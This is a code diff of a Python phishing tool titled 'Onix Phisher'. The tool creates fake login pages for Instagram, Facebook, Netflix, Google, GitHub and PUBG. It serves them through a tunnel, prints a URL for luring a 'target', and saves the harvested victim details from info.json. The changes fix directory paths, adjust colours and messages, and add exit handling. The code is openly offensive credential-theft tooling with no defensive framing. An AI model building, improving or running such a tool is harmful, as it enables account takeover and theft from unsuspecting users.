@@ -11,13 +11,16 @@ try:
     from playsound import playsound
     import pandas as pd
     import keyboard
-except ImportError:
+except ImportError or ModuleNotFoundError:
     install = input(f"{Fore.RED}unfortunately you dont have excepetd modules !!\n{Fore.GREEN}Want to install ? (y/n) :")
     if install.lower == "y" or install.upper == "y":
         os.system("pip install colorama , playsound , pandas , keyboard , pywin32")
         sleep(0.5)
     else:
         exit(Fore.GREEN + "have a good day".title())
+
+#Change Title====================================================================================================
+os.system("title Onix Phisher")
 #build localhost====================================================================================================
 def php_server():
     with open("server" , "w") as log:
@@ -123,11 +126,12 @@ def instagram():
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :{Fore.RESET}" , line.replace("tunneled with tls termination, " , " , "))
-
+    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    
     Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
+
     while True:
         size = os.stat("info.json")
         if size.st_size != 0:
@@ -157,7 +161,10 @@ def instagram():
                 open("info.json" , "w").close()
                 victim_file.close()
 
-                Sprint(Fore.YELLOW + "\nWaiting for target...".title() + Fore.RESET)
+                try:
+                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                except KeyboardInterrupt:
+                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
                 break
 
 #====================================================================================================
@@ -230,9 +237,9 @@ def facebook():
     sleep(8)
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
-    Sprint(Fore.LIGHTWHITE_EX + "waiting for target to connect...\n".title() + Fore.RESET)
+    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     while True:
@@ -243,7 +250,7 @@ def facebook():
             os.chdir(r"..\Voice")
             playsound("T_connected.mp3")
             sleep(0.5)
-            os.chdir(fr"{path}\instagram")
+            os.chdir(fr"{path}\facebook")
             sleep(0.5)
 
 
@@ -264,7 +271,7 @@ def facebook():
                 victim_file.close()
 
                 try:
-                    Sprint(Fore.YELLOW + "\nWaiting for target...".title() + Fore.RESET)
+                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
                 except KeyboardInterrupt:
                     exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
                 break
@@ -340,9 +347,9 @@ def netflix():
     sleep(8)
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
-    Sprint(Fore.LIGHTWHITE_EX + "waiting for target to connect...\n".title() + Fore.RESET)
+    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     while True:
@@ -353,7 +360,7 @@ def netflix():
             os.chdir(r"..\Voice")
             playsound("T_connected.mp3")
             sleep(0.5)
-            os.chdir(fr"{path}\instagram")
+            os.chdir(fr"{path}\Netflix")
             sleep(0.5)
 
 
@@ -373,7 +380,10 @@ def netflix():
                 open("info.json" , "w").close()
                 victim_file.close()
 
-                Sprint(Fore.YELLOW + "\nWaiting for target...".title() + Fore.RESET)
+                try:
+                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                except KeyboardInterrupt:
+                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
                 break
 
 #====================================================================================================
@@ -447,9 +457,9 @@ def Google():
     sleep(8)
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
-    Sprint(Fore.LIGHTWHITE_EX + "waiting for target to connect...\n".title() + Fore.RESET)
+    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     while True:
@@ -460,7 +470,7 @@ def Google():
             os.chdir(r"..\Voice")
             playsound("T_connected.mp3")
             sleep(0.5)
-            os.chdir(fr"{path}\instagram")
+            os.chdir(fr"{path}\Google")
             sleep(0.5)
 
 
@@ -480,7 +490,10 @@ def Google():
                 open("info.json" , "w").close()
                 victim_file.close()
                 
-                Sprint(Fore.YELLOW + "\nWaiting for target...".title() + Fore.RESET)
+                try:
+                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                except KeyboardInterrupt:
+                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
                 break
 
 
@@ -555,9 +568,9 @@ def Github():
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
-    Sprint(Fore.LIGHTWHITE_EX + "waiting for target to connect...\n".title() + Fore.RESET)
+    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     while True:
@@ -568,7 +581,7 @@ def Github():
             os.chdir(r"..\Voice")
             playsound("T_connected.mp3")
             sleep(0.5)
-            os.chdir(fr"{path}\instagram")
+            os.chdir(fr"{path}\Github")
             sleep(0.5)
 
 
@@ -590,7 +603,10 @@ def Github():
                 open("info.json" , "w").close()
                 victim_file.close()
 
-                Sprint(Fore.YELLOW + "\nWaiting for target...".title() + Fore.RESET)
+                try:
+                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                except KeyboardInterrupt:
+                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
                 break
 
 #====================================================================================================
@@ -663,9 +679,9 @@ def Pubg():
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
-    Sprint(Fore.LIGHTWHITE_EX + "waiting for target to connect...\n".title() + Fore.RESET)
+    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
         
 #Write info====================================================================================================
     while True:
@@ -676,7 +692,7 @@ def Pubg():
             os.chdir(r"..\Voice")
             playsound("T_connected.mp3")
             sleep(0.5)
-            os.chdir(fr"{path}\instagram")
+            os.chdir(fr"{path}\Pubg")
             sleep(0.5)
 
 
@@ -698,7 +714,10 @@ def Pubg():
                 open("info.json" , "w").close()
                 victim_file.close()
 
-                Sprint(Fore.YELLOW + "\nWaiting for target...".title() + Fore.RESET)
+                try:
+                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                except KeyboardInterrupt:
+                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
                 break
 
 #====================================================================================================
